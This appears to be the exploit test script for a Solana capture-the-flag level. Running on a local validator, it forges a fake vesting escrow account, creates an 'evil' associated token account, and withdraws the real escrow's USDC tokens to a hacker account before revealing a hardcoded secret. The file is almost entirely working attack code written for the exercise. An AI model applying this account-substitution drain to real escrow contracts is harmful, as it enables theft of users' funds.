import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import * as spl from "@solana/spl-token"
import * as borsh from "@coral-xyz/borsh"
import { Level4 } from "../target/types/level_4";
import * as path from 'path';
import * as fs from 'fs';


const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD")
const ESCROW = new web3.PublicKey("Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP")
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey("2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv")
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa")
const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")
const SECRET = "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd"


describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair('../accounts/hacker.json');
  const mockEscrowKeypair = anchor.web3.Keypair.generate();
  console.log(`Mock Escrow PubKey -> ${mockEscrowKeypair.publicKey}`)
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;

  let escrowPdaAuthority: any;
  let attackEscrow: any;
  let attackEscrowATA: any;


  before("Setup", async () => {
    await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);


  });

  it("creates a mock Escrow account", async () => {
    const ESCROW_DISCRIMINATOR = [31, 213, 123, 187, 186, 22, 218, 155];
  
    const mockEscrow = {
      recipient: HACKER_TOKEN_ACCOUNT,
      mint: USDC,
      amount: new anchor.BN('1e8868', 16),
      withdrawal: new anchor.BN(0),
      startTime: new anchor.BN('66ed1b89', 16),
      endTime: new anchor.BN('66ed4299', 16),
      interval: new anchor.BN(5),
    };
  
    try {
      const tx = await program.methods.initVesting(
        mockEscrow.recipient,
        mockEscrow.amount,
        mockEscrow.startTime,
        mockEscrow.endTime,
        mockEscrow.interval
      )
      .accounts({
        sender: hacker.publicKey,
        senderTokenAccount: HACKER_TOKEN_ACCOUNT,
        escrow: mockEscrowKeypair.publicKey,
        escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
        mint: USDC,
        tokenProgram: spl.TOKEN_2022_PROGRAM_ID,
        systemProgram: web3.SystemProgram.programId,
      })
      .signers([hacker, mockEscrowKeypair])
      .rpc();
  
      console.log("Transaction signature:", tx);
  
      // Fetch the created account to verify its contents
      const escrowAccount = await program.account.escrow.fetch(mockEscrowKeypair.publicKey);
      console.log("Created Escrow account:", escrowAccount);
      attackEscrow = escrowAccount
  
    } catch (error) {
      console.error("Error:", error);
      if (error instanceof anchor.AnchorError) {
        console.log("Error logs:", error.logs);
      }
    }
  });

  it ("derives and create an evil ATA", async () => {
    const attackEscrowAta =  await spl.getAssociatedTokenAddress(
      USDC,
      mockEscrowKeypair.publicKey,
      false,
      spl.TOKEN_2022_PROGRAM_ID,
      spl.ASSOCIATED_TOKEN_PROGRAM_ID
    );
    console.log(`Evil ATA Address-> ${attackEscrowAta}`)

    const tx = new anchor.web3.Transaction().add(
      spl.createAssociatedTokenAccountInstruction(
        hacker.publicKey, // payer
        attackEscrowAta, // ata
        mockEscrowKeypair.publicKey, // owner
        USDC, // mint
        spl.TOKEN_2022_PROGRAM_ID,
        spl.ASSOCIATED_TOKEN_PROGRAM_ID
      )
    );

    await anchor.web3.sendAndConfirmTransaction(provider.connection, tx, [hacker]);

    // Verify the ATA was created
    const accountInfo = await provider.connection.getAccountInfo(attackEscrowAta);
    console.log(`Evil ATA Account Owner -> ${accountInfo.owner}`)

    attackEscrowATA = attackEscrowAta

  });

  it ("Withdraw", async () => {
    const withdraw = await program.methods.withdrawUnlocked()
    .accounts({
      recipient: hacker.publicKey,
      recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
      escrow: attackEscrow,
      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
      escrowPdaAuthority: escrowPdaAuthority,
      mint: USDC,
      tokenProgram: spl.TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId
    })
    .signers([hacker])
    .rpc()
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(withdraw);

  })


 it("Reveals secrets", async () => {

    const airdropSignature = await provider.connection.requestAirdrop(
      hacker.publicKey,
      1000000000 
    );
    await provider.connection.confirmTransaction(airdropSignature);
    
    const tx = await program.methods.revealSecret(SECRET)
      .accounts({
        hacker: hacker.publicKey,
        hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
        mint: USDC
      })
      .transaction();
  
    
    tx.feePayer = hacker.publicKey;
    tx.recentBlockhash = (await provider.connection.getLatestBlockhash()).blockhash;
    tx.sign(hacker);
  
    
    const txid = await provider.connection.sendRawTransaction(tx.serialize()); 
    await new Promise(resolve => setTimeout(resolve, 1000)); 
    console.log("Transaction confirmed. Signature:", txid);
  
    
    const txDetails = await provider.connection.getTransaction(txid, {
      commitment: 'confirmed',
      maxSupportedTransactionVersion: 0
    });
  
    await new Promise(resolve => setTimeout(resolve, 5000));
    console.log("Transaction details:", txDetails);
  
  });
});


async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}

function load_keypair(name: string)
  : anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData))

}
